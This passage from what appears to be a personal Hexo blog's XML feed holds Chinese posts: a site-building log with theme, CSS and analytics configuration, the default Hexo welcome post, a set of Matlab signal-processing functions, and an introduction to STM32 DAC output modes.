  username: litreily
  popular_repos: [hexoBlogProject,jekyllBlog,Student]

# Comments
youyan_username: litreily
duoshuo_username: litreily # 多说配置
#disqus_username: litreily # disqus 配置

# Search
## google | local
search:
    use: local
</code></pre>
<h3 id="Deploy"><a href="#Deploy" class="headerlink" title="Deploy"></a>Deploy</h3><ul>
<li><p>将 <code>jekyll</code> 系统中的博客复制到文件夹 <code>/source/_posts</code> 中</p>
</li>
<li><p>发布博客</p>
</li>
</ul>
<pre><code class="bash">hexo clean
hexo generate
hexo deploy
</code></pre>
<ul>
<li>本地服务器</li>
</ul>
<pre><code class="bash">hexo serve
</code></pre>
<h3 id="Fix"><a href="#Fix" class="headerlink" title="Fix"></a>Fix</h3><ul>
<li>解决代码高亮不正常问题</li>
</ul>
<p>由于 <code>primer</code>主题自带高亮样式，所以需要将原有样式禁用，修改 <strong>根目录</strong> 下的 <code>_config.yml</code> 文件</p>
<pre><code class="YAML">highlight:
  enable: false
  line_number: false
  auto_detect: false
  tab_replace:
</code></pre>
<ul>
<li>解决首页显示全部博文问题</li>
</ul>
<p>首次使用 <code>primer</code> 主题，成功发布后发现主页博客列表显示了整个博文内容，而非摘要，后来查找主题文件发现原主人使用了 <code>excerpt</code> 变量，而我原先使用的均是 <code>description</code> ，所以将主题文件 <code>primer\layout\_partial\article.ejs</code> 中的 <code>excerpt</code> 替换为 <code>description</code> 后便可以了。</p>
<ul>
<li>解决留言板样式不正常问题</li>
</ul>
<p>首先需要说明的是， <code>primer</code> 主题自带 <strong>首页</strong>、<strong>分类</strong> 、 <strong>开源项目</strong> 和 <strong>留言板</strong> 4个页面，当然在使用时，需要通过</p>
<pre><code class="bash">hexo new page categories
hexo new page open-source
hexo new page message
</code></pre>
<p>创建好除首页外的其它三个页面后，因为主题中都有 <code>layout</code> 文件 <code>categories.ejs</code> 与 <code>open.ejs</code>与之对应，所以<code>category</code> 和 <code>open-source</code> 都能够正常显示。</p>
<p>而 <code>message</code> 页面并没有，它默认使用 <code>layout:page</code> ，导致页面中保留了目录栏和分享栏，而这并不是我想要的，所以我在 <code>primer\layout\_partial\</code> 中添加 <code>message.ejs</code> 文件，在 <code>article-post.ejs</code> 文件基础上删除了多余项。</p>
<p>最后在 <code>primer\layout\</code> 中添加 <code>message.ejs</code>（与<code>_partial</code>文件夹中的不同）文件，写入以下内容即可。</p>
<pre><code class="html">&lt;body&gt;
    &lt;%- partial(&#39;_partial/header&#39;) %&gt;
    &lt;%- partial(&#39;_partial/banner-post&#39;,{post: page,index: true}) %&gt;
    &lt;%- partial(&#39;_partial/message&#39;,{post: page,index: false}) %&gt;
</code></pre>
<ul>
<li>categories 与 tags</li>
</ul>
<p>在 <code>jekyll</code> 中，分类与标签基本是一个概念，但在 <code>hexo</code> 却截然不同， <code>categories</code> 有级别之分（按先后顺序分级），而 <code>tags</code> 并没有。所以需要将原有博客重新归类并设置标签。</p>
<h2 id="2016-12-12"><a href="#2016-12-12" class="headerlink" title="2016-12-12"></a>2016-12-12</h2><ul>
<li>将评论系统改为 <a href="http://duoshuo.com/" target="_blank" rel="noopener">多说</a></li>
<li>将原有博文的 <code>h4</code> 标题统一改为 <code>h3</code></li>
<li>添加博文 &quot;建站日志&quot; ，用以记录网站建设过程</li>
<li>将博客部署到域名 <code>www.litreily.top</code></li>
<li>修改 <code>primer\layout\_partial\footer.ejs</code> ，配置 <code>RSS</code> 路径，将 <code>atom.xml</code> 改为 <code>search.xml</code>。</li>
</ul>
<h2 id="2016-12-14"><a href="#2016-12-14" class="headerlink" title="2016-12-14"></a>2016-12-14</h2><ul>
<li>用PS手绘字母 <code>L</code> ，修改网站logo</li>
<li>修复了博文中所有引用 <code>&gt;</code> 显示异常的问题</li>
<li>修复了博文中图片错位的问题</li>
<li>修改了 <code>footer</code> 中的主题链接，已修改为 <a href="https://github.com/Litreily/hexo-theme-primer" target="_blank" rel="noopener">https://github.com/Litreily/hexo-theme-primer</a></li>
</ul>
<h2 id="2016-12-15"><a href="#2016-12-15" class="headerlink" title="2016-12-15"></a>2016-12-15</h2><ul>
<li>对部分博文重新分类，减少 <code>categories</code> 数量</li>
<li>将分类页面的标签栏 <code>Blog Tags</code> 换为分类栏 <code>Blog Categories</code>，并给所有类型添加链接</li>
<li>去除留言板页面中标题下方的时间显示</li>
<li>在 <code>css/_partial/article.styl</code> 中添加了 <code>pre.descriptions</code> 样式</li>
</ul>
<pre><code class="css">pre.descriptions
    font-size: 14px !important;
    border-left: 3px solid #4996D1;
    border-radius: 0 !important;
    background-color: rgba(255,255,255,0) !important;
    margin-left: 2em;
</code></pre>
<p>示例</p>
<hr>
<pre><code class="html">&lt;pre class=&quot;descriptions&quot;&gt;
1. step1
2. step2
3. step3
&lt;/pre&gt;
</code></pre>
<ul>
<li>针对特定博文添加了两个标签样式 <code>tagBlack</code> &amp; <code>tagGrey</code></li>
</ul>
<pre><code class="css">.tagBlack a, .tagGrey a{
    text-decoration: none !important;
    transition: background-color .2s ease;
    padding: .4em .6em;
    margin: 0 3px 3px 0;
    line-height: 1;
    white-space: nowrap;
    font-size: 12px;
    border: 1px solid transparent;
    display: inline-block;
    border-radius: 4px;
}

.tagBlack a{
    color: #FFF;
    background-color: #2f3337;
    &amp;:hover{
        color: #FFF;
        background-color: #0C0D0E;
    }
}

.tagGrey a{
    color: #535a60;
    background-color: #eff0f1;
    border-color: #d6d9dc;
    &amp;:hover{
        color: #535a60;
        background-color: #D6D9DC;
    }
}
</code></pre>
<p>示例</p>
<pre><code class="html">&lt;div class=&quot;tagBlack&quot;&gt;&lt;a href=&quot;http://www.mymmqm.com/&quot;&gt;莫明棋妙&lt;/a&gt;&lt;/div&gt;
&lt;div class=&quot;tagGrey&quot;&gt;&lt;a href=&quot;http://www.xiami.com/artist/68934&quot;&gt;河图&lt;/a&gt;&lt;/div&gt;
</code></pre>
<ul>
<li>在菜单栏加入 <code>标签</code> 项，并在标签页内中加入 <code>标签云</code></li>
</ul>
<pre><code class="txt">tags.ejs: 标签云界面
tag.ejs:  单个标签页，显示某标签内的博客列表，并在侧边显示带有链接的标签栏
</code></pre>
<ul>
<li><p>修改 <code>search.js</code> 与 <code>search-local-js.ejs</code> ，在搜索后的路径中添加 <code>http://</code> , p修复搜索框链接出错问题</p>
</li>
<li><p>在 <code>themes\primer\source</code> 中添加文件 <code>CNAME</code>，添加域名</p>
</li>
</ul>
<pre><code class="yml">www.litreily.top
</code></pre>
<h2 id="2016-12-23"><a href="#2016-12-23" class="headerlink" title="2016-12-23"></a>2016-12-23</h2><ul>
<li>修复RSS，将主题中的 <code>footer.ejs</code> ，将 <code>search</code> 改为 <code>atom</code></li>
</ul>
<pre><code class="html">&lt;a href=&quot;/atom.xml&quot;&gt;
</code></pre>
<p>当然，让博客成功生成 <code>atom.xml</code> 的前提是安装好 <code>feed</code> 生成插件</p>
<pre><code class="bash">npm install hexo-generate-feed --save
</code></pre>
<ul>
<li>参考<a href="http://ibruce.info/2015/04/04/busuanzi/" target="_blank" rel="noopener">不蒜子</a>，添加站点流量统计服务</li>
</ul>
<p>在 <code>head</code> 中导入所需的 <code>js</code> 文件：</p>
<pre><code class="html">&lt;script async src=&quot;//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js&quot;&gt;
&lt;/script&gt;
</code></pre>
<p>并在 <code>banner.ejs</code> 添加两个标签：</p>
<pre><code class="html">&lt;span class=&quot;meta-info&quot;&gt;
    &lt;span class=&quot;octicon octicon-pulse&quot;&gt;&lt;/span&gt;
    &lt;span id=&quot;busuanzi_value_site_pv&quot; class=&quot;views&quot;&gt;&lt;/span&gt;
&lt;/span&gt;
&lt;span class=&quot;meta-info&quot;&gt;
    &lt;span class=&quot;octicon octicon-flame&quot;&gt;&lt;/span&gt;
    &lt;span id=&quot;busuanzi_value_site_uv&quot; class=&quot;views&quot;&gt;&lt;/span&gt;
&lt;/span&gt;
</code></pre>
<ul>
<li>添加百度统计服务</li>
</ul>
<p>在<a href="http://tongji.baidu.com/" target="_blank" rel="noopener">百度统计</a>中添加好站点，根据提示获取统计代码</p>
<pre><code class="html">&lt;script&gt;
    var _hmt = _hmt || [];
    (function() {
    var hm = document.createElement(&quot;script&quot;);
    hm.src = &quot;https://hm.baidu.com/hm.js?d34587ee0aac7488b7dd789f9f17f366&quot;;
    var s = document.getElementsByTagName(&quot;script&quot;)[0];
    s.parentNode.insertBefore(hm, s);
    })();
&lt;/script&gt;
</code></pre>
<p>在 <code>head.ejs</code> 中的 <code>&lt;/head&gt;</code> 前添加以上代码，往后便可在百度统计中查看站点的详细信息啦。</p>
<h2 id="2016-12-24"><a href="#2016-12-24" class="headerlink" title="2016-12-24"></a>2016-12-24</h2><ul>
<li>修复RSS无法被正常获取资源的问题</li>
</ul>
<p>今天用 <code>FeedDemon</code> 获取本站点的 <code>RSS</code> 资源，发现能够得到列表，但点击链接后发现多了一个站点根目录的前缀，后来发现是自己的根目录设置有问题。于是我修改了站点配置文件<code>_config.yml</code>，加上前缀<code>http://</code>就ok了。</p>
<pre><code class="YAML">url: http://www.litreily.top/
root: /
</code></pre>
<p>但是修改以后发现搜索功能又出问题了，这才意识到原来修改 <code>search.js</code> 与 <code>search-local-js.ejs</code> 才是多此一举，原来的问题同样出在这个<code>url</code>，所以只能又将这两个文件的 <code>http://</code> 去掉了。</p>
<h2 id="2017-04-29"><a href="#2017-04-29" class="headerlink" title="2017-04-29"></a>2017-04-29</h2><ul>
<li>更换新主题 <a href="https://github.com/tufu9441/maupassant-hexo" target="_blank" rel="noopener">maupassant</a>，大道至简</li>
<li>解决代码高亮不正常问题</li>
<li>替换搜索引擎至本地搜索</li>
</ul>
<h2 id="2017-04-30"><a href="#2017-04-30" class="headerlink" title="2017-04-30"></a>2017-04-30</h2><ul>
<li>更新主题样式，修复部分文章显示异常的问题</li>
<li>更新标签云样式</li>
</ul>
<h2 id="2017-05-01"><a href="#2017-05-01" class="headerlink" title="2017-05-01"></a>2017-05-01</h2><ul>
<li>在About页面添加联系方式和一句简短的介绍</li>
<li>在菜单中添加了gitbook笔记的接口</li>
</ul>
<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><h3 id="域名"><a href="#域名" class="headerlink" title="域名"></a>域名</h3><ul>
<li>国际域名网：<a href="http://www.yuming.top/" target="_blank" rel="noopener">http://www.yuming.top/</a></li>
</ul>
<h3 id="hexo"><a href="#hexo" class="headerlink" title="hexo"></a>hexo</h3><ul>
<li><code>hexo</code>帮助文档：<a href="https://hexo.io/zh-cn/docs/" target="_blank" rel="noopener">https://hexo.io/zh-cn/docs/</a></li>
<li><code>primer</code>主题：<a href="https://github.com/yumemor/hexo-theme-primer" target="_blank" rel="noopener">https://github.com/yumemor/hexo-theme-primer</a></li>
<li><code>hexo</code>搭建<code>Github-Pages</code>博客填坑教程：<a href="http://www.jianshu.com/p/35e197cb1273" target="_blank" rel="noopener">http://www.jianshu.com/p/35e197cb1273</a></li>
</ul>
<h3 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h3><ul>
<li><strong>不蒜子</strong>站点统计：<a href="http://ibruce.info/2015/04/04/busuanzi/" target="_blank" rel="noopener">http://ibruce.info/2015/04/04/busuanzi/</a></li>
</ul>
]]></content>
      
        <categories>
            
            <category> 杂物柜 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> jekyll </tag>
            
            <tag> hexo </tag>
            
            <tag> log </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Welcome to hexo]]></title>
      <url>https://www.litreily.top/2016/12/10/hello-hexo/</url>
      <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p>
<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post-named-new-post"><a href="#Create-a-new-post-named-new-post" class="headerlink" title="Create a new post named new post"></a>Create a new post named new post</h3><pre><code class="bash">hexo new &quot;My New Post&quot;
</code></pre>
<p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p>
<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><pre><code class="bash">hexo server
</code></pre>
<p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p>
<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><pre><code class="bash">hexo generate
</code></pre>
<p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p>
<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><pre><code class="bash">hexo deploy
</code></pre>
<p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="noopener">Deployment</a></p>
]]></content>
      
        <categories>
            
            <category> Web </category>
            
        </categories>
        
        
        <tags>
            
            <tag> hexo </tag>
            
            <tag> test </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Matlab - 常用函数集锦]]></title>
      <url>https://www.litreily.top/2016/12/09/matlab-Funcs/</url>
      <content type="html"><![CDATA[<p>在使用matlab进行信号处理和图形绘制过程中，某些函数被频繁调用，所以有必要将这些常用函数进行总结归类。</p>
<h2 id="滤波函数"><a href="#滤波函数" class="headerlink" title="滤波函数"></a>滤波函数</h2><h3 id="低通滤波"><a href="#低通滤波" class="headerlink" title="低通滤波"></a>低通滤波</h3><pre><code class="matlab">function [filtered_signal,filtb,filta]=lopass_butterworth(inputsignal,cutoff_freq,Fs,order)
% Low-pass Butterworth filter
% [filtered_signal,filtb,filta] = lopass_butterworth(inputsignal,cutoff_freq,Fs,order)
%
% This is simply a set of built-in Matlab functions, repackaged for ease of
% use by Chad Greene, October 2012.
%
% INPUTS:
% inputsignal = input time series
% cutoff_freq = filter corner frequency
% Fs = data sampling frequency
% order = order of Butterworth filter
%  
% OUTPUTS:
% filtered_signal = the filtered time series
% filtb, filta = filter numerator and denominator (optional)
%
% EXAMPLE 1:
% load train
% t = (1:length(y))/Fs;
% y_filt = lopass_butterworth(y,900,Fs,4); % cut off at 900 Hz
% figure
% plot(t,y,&#39;b&#39;,t,y_filt,&#39;r&#39;)
% xlabel(&#39;time in seconds&#39;)
% box off
% legend(&#39;unfiltered&#39;,&#39;filtered&#39;)
% sound(y,Fs)      % play original time series
% pause(2)         % pause two seconds
% sound(y_filt,Fs) % play filtered time series

nyquist_freq = Fs/2;  % Nyquist frequency
Wn=cutoff_freq/nyquist_freq;    % non-dimensional frequency
[filtb,filta]=butter(order,Wn,&#39;low&#39;); % construct the filter
filtered_signal=filtfilt(filtb,filta,inputsignal); % filter the data with zero phase
</code></pre>
<h3 id="高通滤波"><a href="#高通滤波" class="headerlink" title="高通滤波"></a>高通滤波</h3><pre><code class="matlab">function [filtered_signal,filtb,filta]=hipass_butterworth(inputsignal,cutoff_freq,Fs,order)
% High-pass Butterworth filter
% [filtered_signal,filtb,filta] = hipass_butterworth(inputsignal,cutoff_freq,Fs,order)
%
% This is simply a set of built-in Matlab functions, repackaged for ease of
% use by Chad Greene, October 2012.
%
% INPUTS:
% inputsignal = input time series
% cutoff_freq = filter corner frequency
% Fs = data sampling frequency
% order = order of Butterworth filter
%
% OUTPUTS:
% filtered_signal = the filtered time series
% filtb, filta = filter numerator and denominator (optional)
%
% EXAMPLE 1:
% load train
% t = (1:length(y))/Fs;
% y_filt = hipass_butterworth(y,900,Fs,4); % cut off at 900 Hz
% figure
% plot(t,y,&#39;b&#39;,t,y_filt,&#39;r&#39;)
% xlabel(&#39;time in seconds&#39;)
% box off
% legend(&#39;unfiltered&#39;,&#39;filtered&#39;)
% sound(y,Fs)      % play original time series
% pause(2)         % pause two seconds
% sound(y_filt,Fs) % play filtered time series

nyquist_freq = Fs/2;  % Nyquist frequency
Wn=cutoff_freq/nyquist_freq;    % non-dimensional frequency
[filtb,filta]=butter(order,Wn,&#39;high&#39;); % construct the filter
filtered_signal=filtfilt(filtb,filta,inputsignal); % filter the data with zero phase
</code></pre>
<h3 id="带通滤波"><a href="#带通滤波" class="headerlink" title="带通滤波"></a>带通滤波</h3><pre><code class="matlab">function [filtered_signal,filtb,filta]=bandpass_butterworth(inputsignal,cutoff_freqs,Fs,order)
% Bandpass Butterworth filter
% [filtered_signal,filtb,filta] = bandpass_butterworth(inputsignal,cutoff_freq,Fs,order)
%
% This is simply a set of built-in Matlab functions, repackaged for ease of
% use by Chad Greene, October 2012.
%
% INPUTS:
% inputsignal = input time series
% cutoff_freqs = filter corner frequencies in the form [f1 f2]
% Fs = data sampling frequency
% order = order of Butterworth filter
%
% OUTPUTS:
% filtered_signal = the filtered time series
% filtb, filta = filter numerator and denominator (optional)
%
% EXAMPLE 1:
% load train
% t = (1:length(y))/Fs;
% y_filt = bandpass_butterworth(y,[800 1000],Fs,4); % cut off below 800 Hz and above 1000 Hz
%
% figure
% plot(t,y,&#39;b&#39;,t,y_filt,&#39;r&#39;)
% xlabel(&#39;time in seconds&#39;)
% box off
% legend(&#39;unfiltered&#39;,&#39;filtered&#39;)
% sound(y,Fs)      % play original time series
% pause(2)         % pause two seconds
% sound(y_filt,Fs) % play filtered time series

nyquist_freq = Fs/2;  % Nyquist frequency
Wn=cutoff_freqs/nyquist_freq;    % non-dimensional frequency
[filtb,filta]=butter(order,Wn,&#39;bandpass&#39;); % construct the filter
filtered_signal=filtfilt(filtb,filta,inputsignal); % filter the data with zero phase
</code></pre>
<h3 id="带阻滤波"><a href="#带阻滤波" class="headerlink" title="带阻滤波"></a>带阻滤波</h3><pre><code class="matlab">function [filtered_signal,filtb,filta]=bandstop_butterworth(inputsignal,cutoff_freqs,Fs,order)
% Band-stop Butterworth filter
% [filtered_signal,filtb,filta] = bandstop_butterworth(inputsignal,cutoff_freqs,Fs,order)
%
% This is simply a set of built-in Matlab functions, repackaged for ease of
% use by Chad Greene, October 2012.
%
% INPUTS:
% inputsignal = input time series
% cutoff_freqs = filter corner frequencies in the form [f1 f2]
% Fs = data sampling frequency
% order = order of Butterworth filter
%
% OUTPUTS:
% filtered_signal = the filtered time series
% filtb, filta = filter numerator and denominator (optional)
%
% EXAMPLE 1:
% load train
% t = (1:length(y))/Fs;
% y_filt = bandstop_butterworth(y,[800 1000],Fs,4); % cut off below 800 Hz and above 1000 Hz
%
% figure
% plot(t,y,&#39;b&#39;,t,y_filt,&#39;r&#39;)
% xlabel(&#39;time in seconds&#39;)
% box off
% legend(&#39;unfiltered&#39;,&#39;filtered&#39;)
% sound(y,Fs)      % play original time series
% pause(2)         % pause two seconds
% sound(y_filt,Fs) % play filtered time series

nyquist_freq = Fs/2;  % Nyquist frequency
Wn=cutoff_freqs/nyquist_freq;    % non-dimensional frequency
[filtb,filta]=butter(order,Wn,&#39;stop&#39;); % construct the filter
filtered_signal=filtfilt(filtb,filta,inputsignal); % filter the data with zero phase
</code></pre>
<h2 id="绘图函数"><a href="#绘图函数" class="headerlink" title="绘图函数"></a>绘图函数</h2><pre><code class="matlab">function [  ] = setPlot( varargin )
% setPlot()
% setPlot(title)
% setPlot(title,xlabel)
% setPlot(title,xlable,ylabel)
% setPlot(title,xlabel,ylabel,xlim)
% setPlot(title,xlable,ylabel,xlim,ylim)

narginchk(0,5);     % 判断输入参数是否足够

grid on;
axis tight;

if nargin&gt;=1
    title(varargin{1});
end

if nargin&gt;=2
    xlabel(varargin{2});
end

if nargin&gt;=3
    ylabel(varargin{3});
end

if nargin&gt;=4
    xlim(varargin{4});
end

if nargin&gt;=5
    ylim(varargin{5});
end

end
</code></pre>
<h2 id="信号处理函数"><a href="#信号处理函数" class="headerlink" title="信号处理函数"></a>信号处理函数</h2><h3 id="频谱分析"><a href="#频谱分析" class="headerlink" title="频谱分析"></a>频谱分析</h3><pre><code class="matlab">function [freq,amp]=fft_signal(signal,fs,N)
% Spectrum analysis
% INPUTS:
% signal = input time series
% fs = data sampling frequency
% N = data length of signal
%
% OUTPUTS:
% freq = frequency of Spectrum
% amp = amplitude of Spectrum
%
% EXAMPLE 1:
% fs = 100;
% N = fs*10;
% t = (0:N-1)/fs;
% y = sin(2*pi*10*t);
% [freq,amp] = fft_signal(y,fs,N);
% plot(freq,amp);

amp = 2*abs(fft(signal))/N;        % 求取信号的幅度谱
amp = amp(1:fix(length(amp)/2));       % 截取有效部分
freq=(0:length(amp)-1)*fs/N;       % 横坐标代表频率
end
</code></pre>
<h3 id="幅值分布"><a href="#幅值分布" class="headerlink" title="幅值分布"></a>幅值分布</h3><pre><code class="matlab">function [ amp,dist ] = ampDist( signal,sectionNum )
% Calculate the amplitude distribution of the signal
% INPUTS:
% signal : The signal to be analyzed
% sectionNum : Number of segments
%
% OUTPUTS:
% amp : Amplitude after segmentation
% dist :Amplitude distribution
%
% EXAMPLE 1:
% fs = 1000;
% N = fs*100;
% y = wgn(1,N,10);     % 高斯白噪声
% [amp,dist] = ampDist(y,500);
% bar(amp,dist);

yMin = min(signal);
yMax = max(signal);

amp = linspace(yMin,yMax,sectionNum);
dist = hist(signal,amp);
dist = dist./length(signal);
end
</code></pre>
<h3 id="LMS最小均方算法"><a href="#LMS最小均方算法" class="headerlink" title="LMS最小均方算法"></a>LMS最小均方算法</h3><pre><code class="matlab">function [ y_error, y_filter ] = LMS( x_input,x_dest,M,u )
% LMS 最小均方算法
% INPUTS：
% x_input    原始信号
% x_dest     期望信号
% M          阶次
% u          步长因子
%
% OUTPUTS：
% y_error    误差信号
% y_filter   滤波器信号输出
%
% EXAMPLE 1:
% load train
% t = (1:length(y))/Fs;
% M = 2; u = 0.5;
% y_dest = (max(y)-min(y))/2*cos(2*pi*18*t);      % 参考信号
% [y_error,y_filter] = LMS(y,y_dest,M,u);
% plot(t,y_error,t,y_filter);

N = length(x_input);
y_filter = zeros(1,N);
y_error  = zeros(1,N);
h = zeros(1,M);

for k=M:N
    h_old = h;
    y_filter(k) = x_dest(k:-1:k-M+1)*h_old&#39;;
    y_error(k)  = x_input(k) - y_filter(k);
    h = h_old + 2*u*y_error(k)*x_dest(k:-1:k-M+1);
end

end
</code></pre>
<h3 id="EMD经验模态分解"><a href="#EMD经验模态分解" class="headerlink" title="EMD经验模态分解"></a>EMD经验模态分解</h3><pre><code class="matlab">function imf = emd(x)
% Empiricial Mode Decomposition (Hilbert-Huang Transform)
% imf = emd(x)
% Funcs : ismonotonic, isimf, getspline, findpeaks

x   = transpose(x(:));      % 将x变为一维向量
imf = [];
while ~ismonotonic(x)
   x1 = x;
   sd = Inf;
   cnt=0;
   while (sd &gt; 0.1) || ~isimf(x1)
      s1 = getspline(x1);
      s2 = -getspline(-x1);
      x2 = x1-(s1+s2)/2;

      sd = sum((x1-x2).^2)/sum(x1.^2);
      x1 = x2;
      cnt=cnt+1;
   end
%    cnt

   imf{end+1} = x1;
   x          = x-x1;
end
imf{end+1} = x;

% FUNCTIONS
% 判断信号的单调性
function u = ismonotonic(x)

u1 = length(findpeaks(x))*length(findpeaks(-x));
if u1 &gt; 0
    u = 0;
else
    u = 1;
end

% 判断信号是否满足IMF条件
% 条件：极大值点数和极小值点数之和与过零点数相等或相差1？
function u = isimf(x)

N  = length(x);
u1 = sum(x(1:N-1).*x(2:N) &lt; 0);
u2 = length(findpeaks(x))+length(findpeaks(-x));
if abs(u1-u2) &gt; 1
    u = 0;
else
    u = 1;
end

% 使用三次样条函数，得到包络线
function s = getspline(x)

N = length(x);
p = findpeaks(x);
s = spline([0 p N+1],[0 x(p) 0],1:N);

% 寻找极大值点
function n = findpeaks(x)
% Find peaks.
% n = findpeaks(x)

n    = find(diff(diff(x) &gt; 0) &lt; 0);
u    = find(x(n+1) &gt; x(n));
n(u) = n(u)+1;
</code></pre>
]]></content>
      
        <categories>
            
            <category> Matlab </category>
            
        </categories>
        
        
        <tags>
            
            <tag> signal </tag>
            
            <tag> matlab </tag>
            
            <tag> algorithm </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[stm32 - DAC基本输出方式]]></title>
      <url>https://www.litreily.top/2016/12/05/stm32-dac/</url>
      <content type="html"><![CDATA[<h2 id="DAC简介"><a href="#DAC简介" class="headerlink" title="DAC简介"></a>DAC简介</h2><p>数模转换器(DAC)是极为常用的电子器件，可以将数字量转换为以参考量为基准的模拟量，以满足应用需求。</p>
<h3 id="电压输出模式"><a href="#电压输出模式" class="headerlink" title="电压输出模式"></a>电压输出模式</h3><p>在<code>stm32</code>中，<code>D/A</code>转换器包含以下三种输出方式：</p>
<ol>
<li>输出电压</li>
<li>噪声生成</li>
<li>三角波生成</li>
</ol>
<p>本文将着重介绍最基本的电压输出方式。</p>
<h3 id="主要特征"><a href="#主要特征" class="headerlink" title="主要特征"></a>主要特征</h3><p>DAC的主要特征有：</p>
<ol>
<li>2个DAC转换器：1个输出通道对应1个转换器</li>
<li>8位或者12位单调输出</li>
<li>12位模式下数据左对齐或者右对齐</li>
<li>同步更新功能</li>
<li>噪声波形生成</li>
<li>三角波形生成</li>
<li>双DAC通道同时或者分别转换</li>
<li>每个通道都有DMA功能</li>
<li>外部触发转换</li>
<li>输入参考电压V_REF+</li>
</ol>
<h3 id="数据对齐方式"><a href="#数据对齐方式" class="headerlink" title="数据对齐方式"></a>数据对齐方式</h3><p>DAC 输出通道的数据对齐方式包含以下三种：</p>
<ol>
<li>8位右对齐</li>
<li>12位左对齐</li>
<li>12位右对齐</li>
</ol>
<p>此外，在单 DAC 通道模式下，数据寄存器的存储方式如下：</p>
<p><img src="/assets/stm32/dacAlignMode.png" alt="dacAlignMode1"></p>
<p>在双 DAC 通道模式下，数据寄存器的存储方式则为：</p>
<p><img src="/assets/stm32/dacAlignMode2.png" alt="dacAlignMode2"></p>
<p>我通常会选择12位右对齐方式，并在单通道模式设置数据时与<code>0x0fff</code>进行&quot;位与&quot;。</p>
<h3 id="DAC转换"><a href="#DAC转换" class="headerlink" title="DAC转换"></a>DAC转换</h3><p><img src="/assets/stm32/dacConvert.png" alt="dacConvert"></p>
<p>用户无法直接对DAC的数据寄存器 DAC_DORx 写入数据，只能通过修改数据保持寄存器 DAC_DHRx 装入数据。</p>
<ol>
<li>未选择&quot;硬件触发&quot;时，保持寄存器 DAC_DHRx 的值将在1个APB1周期后自动传入数据寄存器 DAC_DORx；</li>
<li>已选择&quot;硬件触发&quot;时，保持寄存器 DAC_DHRx 的值将在触发发生后3个APB1后传入数据寄存器 DAC_DORx。</li>
<li>当数据存入 DAC_DORx 后再经过时间 t_settings（与负载和电源电压有关），输出变为有效。</li>
</ol>
<h3 id="DAC触发方式"><a href="#DAC触发方式" class="headerlink" title="DAC触发方式"></a>DAC触发方式</h3><pre><code class="C">#define DAC_Trigger_None                   ((uint32_t)0x00000000)
/*!&lt; Conversion is automatic once the DAC1_DHRxxxx register
has been loaded, and not by external trigger */

#define DAC_Trigger_T6_TRGO                ((uint32_t)0x00000004)
/*!&lt; TIM6 TRGO selected as external conversion trigger for DAC channel */

#define DAC_Trigger_T8_TRGO                ((uint32_t)0x0000000C)
/*!&lt; TIM8 TRGO selected as external conversion trigger for DAC channel
only in High-density devices*/

#define DAC_Trigger_T3_TRGO                ((uint32_t)0x0000000C)
/*!&lt; TIM8 TRGO selected as external conversion trigger for DAC channel
only in Connectivity line, Medium-density and Low-density Value Line devices */

#define DAC_Trigger_T7_TRGO                ((uint32_t)0x00000014)
/*!&lt; TIM7 TRGO selected as external conversion trigger for DAC channel */

#define DAC_Trigger_T5_TRGO                ((uint32_t)0x0000001C)
/*!&lt; TIM5 TRGO selected as external conversion trigger for DAC channel */

#define DAC_Trigger_T15_TRGO               ((uint32_t)0x0000001C)
/*!&lt; TIM15 TRGO selected as external conversion trigger for DAC channel
only in Medium-density and Low-density Value Line devices*/

#define DAC_Trigger_T2_TRGO                ((uint32_t)0x00000024)
/*!&lt; TIM2 TRGO selected as external conversion trigger for DAC channel */

#define DAC_Trigger_T4_TRGO                ((uint32_t)0x0000002C)
/*!&lt; TIM4 TRGO selected as external conversion trigger for DAC channel */

#define DAC_Trigger_Ext_IT9                ((uint32_t)0x00000034)
/*!&lt; EXTI Line9 event selected as external conversion trigger for DAC channel */

#define DAC_Trigger_Software               ((uint32_t)0x0000003C)
/*!&lt; Conversion started by software trigger for DAC channel */
</code></pre>
<p><strong>触发方式</strong> 大致可分为四类：</p>
<ol>
<li>DAC_Trigger_None : 无触发;</li>
<li>DAC_Trigger_Tx_TRGO : 来自片上定时器的TRGO输出</li>
<li>DAC_Trigger_Ext_IT9 : 来自外部中断线9的上升沿</li>
<li>DAC_Trigger_Software : 来自软件控制位 SWTRIG</li>
</ol>
<p>当 DAC 接口检测到来自定时器 <strong>TRGO输出</strong> 或 <strong>EXTI9</strong> 的上升沿时，最近存入 DAC_DHRx 中的数据将被传入 DAC_DORx 中。经3个APB1周期后更新 DAC_DORx 的值。对于 &quot;软件触发&quot;，需要在程序中对 <strong>SWTRIG</strong> 置位完成触发，该触发位将被硬件自动清零。</p>
<h3 id="DAC输出电压"><a href="#DAC输出电压" class="headerlink" title="DAC输出电压"></a>DAC输出电压</h3><p>DAC输出 = V_reference × DOR /4095;</p>
<p>式中，V_reference 为参考电压，DOR 为 DAC 输出数据寄存器的值（0~255/0~4095）。</p>
